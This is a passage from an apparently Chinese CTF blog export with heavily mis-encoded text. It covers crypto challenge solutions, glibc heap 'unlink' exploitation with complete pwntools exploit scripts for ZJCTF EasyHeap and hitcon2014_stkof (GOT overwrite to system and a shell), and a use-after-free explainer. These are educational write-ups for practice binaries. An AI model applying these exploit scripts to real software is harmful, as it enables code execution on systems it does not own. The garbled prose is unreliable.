class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span>  yaf(p)</span><br><span class="line"></span><br><span class="line">p = yaf(kp)</span><br><span class="line">n = p*q</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wision</span>(<span class="params">p,q</span>):</span></span><br><span class="line">    t=-<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(p-q,p):</span><br><span class="line">        t=t*invert(i,p) %p</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">k=wision(p,q)</span><br><span class="line">d=invert(e,p-<span class="number">1</span>)</span><br><span class="line">c=c2*invert(<span class="built_in">pow</span>(k,e,n),n)%p</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,p)))</span><br></pre></td></tr></table></figure>
<h2 id="crypto6"><a class="header-anchor" href="#crypto6">Â¶</a>crypto6</h2>
<h3 id="é¢˜ç›®-v10"><a class="header-anchor" href="#é¢˜ç›®-v10">Â¶</a>é¢˜ç›®</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;************************************&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;NSSCTF&#123;&#x27;</span> + base64.b16encode(base64.b32encode(base64.b64encode(var.encode()))) + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">å°æ˜ä¸å°å¿ƒæ³„éœ²äº†æºç ï¼Œè¾“å‡ºç»“æœä¸ºï¼š4A5A4C564B36434E4B5241544B5432454E4E32465552324E47424758534D44594C4657564336534D4B5241584F574C4B4B463245365643424F35485649534C584A5A56454B4D4B5049354E47593D3D3Dï¼Œä½ èƒ½è¿˜åŸå‡ºvarçš„æ­£ç¡®ç»“æœå—ï¼Ÿ</span><br></pre></td></tr></table></figure>
<h3 id="exp-v8"><a class="header-anchor" href="#exp-v8">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;4A5A4C564B36434E4B5241544B5432454E4E32465552324E47424758534D44594C4657564336534D4B5241584F574C4B4B463245365643424F35485649534C584A5A56454B4D4B5049354E47593D3D3D&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;NSSCTF&#123;&#x27;</span>+base64.b64decode(base64.b32decode(base64.b16decode(s)))+<span class="string">b&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="crypto7"><a class="header-anchor" href="#crypto7">Â¶</a>crypto7</h2>
<h3 id="é¢˜ç›®-v11"><a class="header-anchor" href="#é¢˜ç›®-v11">Â¶</a>é¢˜ç›®</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">69f7906323b4f7d1e4e972acf4abfbfc,å¾—åˆ°çš„ç»“æœç”¨NSSCTF&#123;&#125;åŒ…è£¹ã€‚</span><br></pre></td></tr></table></figure>
<h3 id="é¢˜è§£-v3"><a class="header-anchor" href="#é¢˜è§£-v3">Â¶</a>é¢˜è§£</h3>
<p>CMD5ç›´æ¥è§£ <a href="https://cmd5.com/">https://cmd5.com/</a><br>
<img src="http://static.zybuluo.com/hgggg/yo17lzfvcodj3kbhkvtvabni/image_1fk1l4tnednu16q81fjv1fq918hj9.png" alt="image_1fk1l4tnednu16q81fjv1fq918hj9.png-19.1kB"></p>
<h2 id="crypto8"><a class="header-anchor" href="#crypto8">Â¶</a>crypto8</h2>
<h3 id="é¢˜ç›®-v12"><a class="header-anchor" href="#é¢˜ç›®-v12">Â¶</a>é¢˜ç›®</h3>
<pre><code>73E-30U1&amp;&gt;V-H965S95]I&lt;U]P;W=E&lt;GT`
</code></pre>
<h3 id="é¢˜è§£-v4"><a class="header-anchor" href="#é¢˜è§£-v4">Â¶</a>é¢˜è§£</h3>
<p>uuencode<br>
<a href="http://www.hiencode.com/uu.html">http://www.hiencode.com/uu.html</a><br>
<img src="http://static.zybuluo.com/hgggg/3pralsmx3kcjbll0l8p85x8g/image_1fk1qb8i9104idn31in81t9m17rjm.png" alt="image_1fk1qb8i9104idn31in81t9m17rjm.png-34.2kB"></p>
]]></content>
      <categories>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>Unlink</title>
    <url>/2021/10/04/Unlink/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/41.jpg" alt="pic"></p>
<span id="more"></span>
<h2 id="åŸç†ä»‹ç»"><a class="header-anchor" href="#åŸç†ä»‹ç»">Â¶</a>åŸç†ä»‹ç»</h2>
<h3 id="unlink"><a class="header-anchor" href="#unlink">Â¶</a>unlink</h3>
<p>unlinkå…¶å®è¿›è¡Œè„±é“¾æ“ä½œï¼Œä¸‹é¢è´´ä¸€å¼ CTF-wikiä¸Šçš„åŸç†å›¾</p>
<p><img src="http://static.zybuluo.com/hgggg/sbd9qfl3g1fi9ty3umi38vot/38.png" alt="38.png-123.8kB"></p>
<p>ä¸€èˆ¬æ¥è¯´å°±æ˜¯å°†é“¾è¡¨å¤´å¤„å¤„äºfreeçŠ¶æ€çš„å †å—ä»unsorted binä¸­è„±ç¦»å‡ºæ¥ï¼Œ<br>
ç„¶åå’Œç‰©ç†ç›¸é‚»çš„å †å—åˆå¹¶æˆæ–°çš„å¤§å †å—ï¼ˆå‘å‰åˆå¹¶/å‘ååˆå¹¶ï¼‰ï¼Œæœ€åå†æ”¾å…¥åˆ°<br>
unsortedbinä¸­</p>
<h3 id="unlink-æºç é˜…è¯»"><a class="header-anchor" href="#unlink-æºç é˜…è¯»">Â¶</a>unlink æºç é˜…è¯»</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* at malloc.c _int_free */</span></span><br><span class="line">  <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨freeå½“å‰å †å—çš„æ˜¯åï¼Œä¼šå…ˆæ£€æŸ¥å…¶ç‰©ç†ç›¸é‚»çš„å‰ä¸€ä¸ªå †å—æ˜¯ä¸æ˜¯å¤„äºé‡Šæ”¾çŠ¶æ€ï¼Œå¦‚æœå¤„äºfreeçŠ¶æ€åˆ™è¿›å…¥åˆ¤æ–­</p>
<p>å°†é¦–å…ˆä¼šæå–å½“å‰å †å—çš„å‰ä¸€ä¸ªå †å—çš„å¤§å°</p>
<p>å°†å½“å‰å †å—çš„sizeå’Œå‰ä¸€ä¸ªå †å—çš„sizeç›¸åŠ ï¼Œå³åˆå¹¶</p>
<p>å°†å½“å‰å †å—çš„æŒ‡é’ˆæŒ‡å‘å‰ä¸€ä¸ªå †å—</p>
<p>ç„¶åunlinkï¼Œå³å°†å½“å‰çš„Pæ‰€æŒ‡å‘çš„chunkä»åŒé“¾è¡¨ä¸­ç§»é™¤</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;								      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;								      \</span></span><br><span class="line"><span class="meta">    <span class="meta-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (check_action, <span class="meta-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span></span><br><span class="line"><span class="meta">    <span class="meta-keyword">else</span> &#123;								      \</span></span><br><span class="line"><span class="meta">        FD-&gt;bk = BK;							      \</span></span><br><span class="line"><span class="meta">        BK-&gt;fd = FD;							      \</span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">if</span> (!in_smallbin_range (P-&gt;size)				      \</span></span><br><span class="line"><span class="meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;		      \</span></span><br><span class="line"><span class="meta">	    <span class="meta-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)	      \</span></span><br><span class="line"><span class="meta">		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span></span><br><span class="line"><span class="meta">	      malloc_printerr (check_action,				      \</span></span><br><span class="line"><span class="meta">			       <span class="meta-string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span></span><br><span class="line"><span class="meta">			       P, AV);					      \</span></span><br><span class="line"><span class="meta">            <span class="meta-keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;				      \</span></span><br><span class="line"><span class="meta">                <span class="meta-keyword">if</span> (P-&gt;fd_nextsize == P)				      \</span></span><br><span class="line"><span class="meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      \</span></span><br><span class="line"><span class="meta">                <span class="meta-keyword">else</span> &#123;							      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      \</span></span><br><span class="line"><span class="meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      \</span></span><br><span class="line"><span class="meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      \</span></span><br><span class="line"><span class="meta">                  &#125;							      \</span></span><br><span class="line"><span class="meta">              &#125; <span class="meta-keyword">else</span> &#123;							      \</span></span><br><span class="line"><span class="meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      \</span></span><br><span class="line"><span class="meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      \</span></span><br><span class="line"><span class="meta">              &#125;								      \</span></span><br><span class="line"><span class="meta">          &#125;								      \</span></span><br><span class="line"><span class="meta">      &#125;									      \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œä¼šè¿›è¡Œä¸€ä¸ªæ£€æŸ¥ï¼Œåˆ¤æ–­FDçš„bkå’ŒBKçš„fdæ˜¯å¦æŒ‡å‘å½“å‰å †å—</p>
<h3 id="Unlink-çš„ç»•è¿‡å’Œåˆ©ç”¨"><a class="header-anchor" href="#Unlink-çš„ç»•è¿‡å’Œåˆ©ç”¨">Â¶</a>Unlink çš„ç»•è¿‡å’Œåˆ©ç”¨</h3>
<p>step1:ä¼ªé€ fake chunk</p>
<pre><code>chunk = 0x0602040
P ä¸ºæˆ‘ä»¬å°†è¦åˆå¹¶çš„åœ°å€,På­˜åœ¨äºchunkä¸­ï¼Œä¸”æœ‰*(chunk)=P
P-&gt;fd = chunk - 0x18 = 0x602028
P-&gt;bk = chunk - 0x10 = 0x602030
</code></pre>
<p>Step2: ç»•è¿‡æ£€æŸ¥</p>
<pre><code>Unlink(P,BK,FD)&#123;
    FD = P-&gt;fd     // FD = 0x602028
    BK = P-&gt;bk     // BK = 0x602030
    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))&#123;
     // æ£€æŸ¥ç»•è¿‡ FD-&gt;bk = *(0x602028+0x18) = *(0x602040)
     //ç»•è¿‡2 Bk-&gt;fd = *(0x602030+0x10) = *(0x602040)  
     FD-&gt;bk = BK //*(0x602040) = 0x602030
     BK-&gt;fd = FD   //*(0x6020240) = 0x602028
    &#125;
&#125;
</code></pre>
<p>Step3: åŠ«æŒç¨‹åºæ‰§è¡Œæµ</p>
<pre><code>ç»è¿‡ä¸Šè¿°çš„æ­¥éª¤ï¼Œæˆ‘ä»¬å·²ç»å®ç°äº†åœ¨*(chunk)ä¸­å†™å…¥äº†chunk-0x18çš„å€¼
å¦‚è¿‡æˆ‘å‘chunk - 0x18 å†™å…¥__free_hook,åœ¨æˆ‘ä¸‹ä¸€æ¬¡ä¿®æ”¹çš„æ—¶å€™å°±å¯ä»¥æŠŠ__free_hookæ”¹å†™ä¸ºsystem
</code></pre>
<h2 id="åˆ—é¢˜"><a class="header-anchor" href="#åˆ—é¢˜">Â¶</a>åˆ—é¢˜</h2>
<h3 id="ZJCTF-2019-EasyHeap"><a class="header-anchor" href="#ZJCTF-2019-EasyHeap">Â¶</a>ZJCTF 2019 EasyHeap</h3>
<p>è¿™é“é¢˜ç½‘ä¸Šçš„wpå¤§å¤šéƒ½æ˜¯house of spirit ä»¥åŠ Unsorted bin attack, è¿™é‡Œä»‹ç»ä¸€ç§Unlinkçš„æ”»å‡»æ–¹å¼</p>
<h4 id="IDAåˆ†æ"><a class="header-anchor" href="#IDAåˆ†æ">Â¶</a>IDAåˆ†æ</h4>
<p>add</p>
<p><img src="http://static.zybuluo.com/hgggg/be6e1prqqmpinvcx751v0xlp/39.png" alt="39.png-43.8kB"></p>
<p>å¯ä»¥çœ‹åˆ°addæ˜¯ç”¨ä¸€ä¸ªheaparrayçš„æ•°ç»„æ¥ç®¡ç†å †å—çš„</p>
<p><img src="http://static.zybuluo.com/hgggg/ebbhnt7xr0p8sxtcrqky20zq/40.png" alt="40.png-19.9kB"></p>
<p>edit</p>
<p><img src="http://static.zybuluo.com/hgggg/icy3zhxsx8ifxfjuc1eezl92/41.png" alt="41.png-50.9kB"></p>
<p>delete</p>
<p><img src="http://static.zybuluo.com/hgggg/x6npivuk736g3yvmlb5dnw3k/42.png" alt="42.png-32kB"></p>
<p>åŒæ—¶è¯¥é¢˜ä¹Ÿæ²¡å¼€å¯PIEä¿æŠ¤</p>
<p><img src="http://static.zybuluo.com/hgggg/ksgf2d6r9b7dr7d238ixo334/43.png" alt="43.png-23.7kB"></p>
<p>è¿™é¢˜å°±éå¸¸é€‚åˆåˆ©ç”¨Unlinkæ‰‹æ³•æ¥æ„é€ exp</p>
<h4 id="è§£é¢˜æ€è·¯"><a class="header-anchor" href="#è§£é¢˜æ€è·¯">Â¶</a>è§£é¢˜æ€è·¯</h4>
<p>Step1:ä¼ªé€ fake chunk</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(chunk-<span class="number">0x18</span>)+p64(chunk-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>
<p>ä¼ªé€ åå¯ä»¥å‘ç°æ­¤æ—¶chunk0å¤„äºfreeçŠ¶æ€</p>
<p><img src="http://static.zybuluo.com/hgggg/e5mmfpfyovlu8qpi6d4c8l4b/44.png" alt="44.png-21.6kB"></p>
<p>æ­¤æ—¶æˆ‘ä»¬é‡Šæ”¾æ‰å †å—1ï¼Œå¯ä»¥å‘ç°å †å—0å’Œå †å—1æˆåŠŸåˆå¹¶ï¼Œè§¦å‘Unlink</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p><img src="http://static.zybuluo.com/hgggg/toot7r72l7m2qjirr2sj3sue/45.png" alt="45.png-77.3kB"></p>
<p>Step2ï¼šä»»æ„åœ°å€å†™</p>
<p>å¯ä»¥çœ‹åˆ°chunk0å·²ç»æŒ‡å‘äº†0x6020c8,æˆ‘ä»¬å¯ä»¥é€šè¿‡edit(0)ä¸ºsystemæœ€ågetshell</p>
<p><img src="http://static.zybuluo.com/hgggg/5w8ayit4cce7b0if21xr16st/46.png" alt="46.png-38.3kB"></p>
<h4 id="exp"><a class="header-anchor" href="#exp">Â¶</a>exp</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p  = process(<span class="string">&quot;easyheap&quot;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;easyheap&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size of Heap : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content of heap:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size of Heap : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content of heap : &quot;</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line"></span><br><span class="line">chunk = <span class="number">0x6020E0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(chunk-<span class="number">0x18</span>)+p64(chunk-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">system = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(system)+p64(system)+p64(free_got)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x10</span>,p64(system))</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="hitcon2014-stkof"><a class="header-anchor" href="#hitcon2014-stkof">Â¶</a>hitcon2014_stkof</h3>
<h4 id="é¢˜ç›®åˆ†æ"><a class="header-anchor" href="#é¢˜ç›®åˆ†æ">Â¶</a>é¢˜ç›®åˆ†æ</h4>
<p>æœ¬é¢˜å’Œä¸Šä¸€é¢˜åŒºåˆ«ä¸å¤§ï¼Œå”¯ä¸€çš„åŒºåˆ«å°±åœ¨äºæœ¬é¢˜æ²¡æœ‰è°ƒç”¨systemå‡½æ•°ï¼Œéœ€è¦æ³„éœ²libcåœ°å€</p>
<p>å³æŠŠfree_got æ”¹ä¸º puts_pltå³å¯æ³„éœ²åœ°å€</p>
<h4 id="exp-v2"><a class="header-anchor" href="#exp-v2">Â¶</a>exp</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;stkof&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;stkof&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26259</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendline(content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">chunk = <span class="number">0x602150</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0xf0</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">payload =  p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(chunk-<span class="number">0x18</span>)+p64(chunk-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+ p64(atoi_got)+p64(atoi_got)+p64(free_got)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(p64(puts_plt)),p64(puts_plt))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + one[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(p64(system)),p64(system))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#p.sendline(&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x8</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwnç¬”è®°</tag>
        <tag>glibcå †</tag>
      </tags>
  </entry>
  <entry>
    <title>UAF</title>
    <url>/2021/10/04/UAF/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/40.jpg" alt="pic"></p>
<span id="more"></span>
<h2 id="åŸç†"><a class="header-anchor" href="#åŸç†">Â¶</a>åŸç†</h2>
<pre><code>å°±æ˜¯æŸå—å†…å­˜é‡Šæ”¾åï¼Œä»»èƒ½è¢«ç”¨æˆ·ä½¿ç”¨ï¼Œå³å­˜åœ¨é‡æŒ‡é’ˆï¼ˆä¸€èˆ¬æ˜¯freeåæ²¡æœ‰å°†æŒ‡é’ˆç½®NULLï¼‰
</code></pre>
<h3 id="æ ·ä¾‹"><a class="header-anchor" href="#æ ·ä¾‹">Â¶</a>æ ·ä¾‹</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">name</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> *myname;</span><br><span class="line">  <span class="keyword">void</span> (*func)(<span class="keyword">char</span> *str);</span><br><span class="line">&#125; NAME;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myprint</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printmyname</span><span class="params">()</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;call print my name\n&quot;</span>); &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  NAME *a;</span><br><span class="line">  a = (NAME *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct name));</span><br><span class="line">  a-&gt;func = myprint;</span><br><span class="line">  a-&gt;myname = <span class="string">&quot;I can also use it&quot;</span>;</span><br><span class="line">  a-&gt;func(<span class="string">&quot;this is my function&quot;</span>);</span><br><span class="line">  <span class="comment">// free without modify</span></span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  a-&gt;func(<span class="string">&quot;I can also use it&quot;</span>);</span><br><span class="line">  <span class="comment">// free with modify</span></span><br><span class="line">  a-&gt;func = printmyname;</span><br><span class="line">  a-&gt;func(<span class="string">&quot;this is my function&quot;</span>);</span><br><span class="line">  <span class="comment">// set NULL</span></span><br><span class="line">  a = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;this pogram will crash...\n&quot;</span>);</span><br><span class="line">  a-&gt;func(<span class="string">&quot;can not be printed...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="mallocå†…å­˜å¯¹é½"><a class="header-anchor" href="#mallocå†…å­˜å¯¹é½">Â¶</a>mallocå†…å­˜å¯¹é½</h3>
<p>åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œç¼–è¯‘å™¨å’ŒCåº“é€æ˜åœ°å¸®ä½ å¤„ç†å¯¹é½é—®é¢˜ã€‚POSIX æ ‡æ˜äº†é€šè¿‡malloc( ), calloc( ), å’Œ realloc( ) è¿”å›çš„åœ°å€å¯¹äºä»»ä½•çš„Cç±»å‹æ¥è¯´éƒ½æ˜¯å¯¹é½çš„ã€‚è¿™æ ·å¯ä»¥é¿å…å†…å­˜ä¸­çš„ç¢ç‰‡ï¼Œæé«˜ç¨‹åºæ•ˆç‡ã€‚</p>
<p>æ¥çœ‹ä¸‹malloc.hçš„éƒ¨åˆ†æºç </p>
